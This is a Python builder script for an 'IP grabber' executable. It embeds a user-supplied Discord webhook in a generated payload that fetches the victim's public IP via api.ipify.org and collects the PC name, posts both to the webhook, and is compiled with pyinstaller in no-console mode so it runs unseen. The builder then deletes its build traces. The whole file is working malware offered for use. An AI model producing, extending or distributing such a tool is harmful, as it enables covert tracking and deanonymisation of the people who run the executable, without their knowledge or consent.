import os
import shutil

webhook = input("Enter the Discord Webhook URL: ").strip()
if not webhook:
    print("❌ Webhook cannot be empty.")
    exit()

filename = input("Enter output filename (without .exe): ").strip()
if not filename:
    filename = "IPGrabber"

py_file = f"{filename}.py"

# Create the actual grabber script with the webhook hardcoded
payload_code = f'''
import requests
import platform
from datetime import datetime

WEBHOOK_URL = "{webhook}"

def send_ip_data():
    try:
        ip = requests.get('https://api.ipify.org', timeout=10).text
        data = {{
            "content": (
                "🌐 **IP Grabbed**\\n"
                f"🔢 **IP:** `{{ip}}`\\n"
                f"💻 **PC Name:** `{{platform.node()}}`\\n"
                f"⏰ **Time:** `{{datetime.now()}}`"
            )
        }}
        requests.post(WEBHOOK_URL, json=data, timeout=10)
    except:
        pass

if __name__ == "__main__":
    send_ip_data()
'''

# Save the generated Python code to a file named after the user's input
with open(py_file, "w", encoding="utf-8") as f:
    f.write(payload_code)

print("📦 Creating EXE file...")
os.system(f"pyinstaller --onefile --noconsole --name \"{filename}\" \"{py_file}\"")

# Move the resulting EXE from /dist to current folder
exe_path = f"dist/{filename}.exe"
if os.path.exists(exe_path):
    shutil.move(exe_path, f"./{filename}.exe")

# Cleanup
for folder in ["build", "dist"]:
    shutil.rmtree(folder, ignore_errors=True)

for ext in [".spec", ".py"]:
    try:
        os.remove(f"{filename}{ext}")
    except FileNotFoundError:
        pass

print(f"✅ Done! Your executable is: {filename}.exe")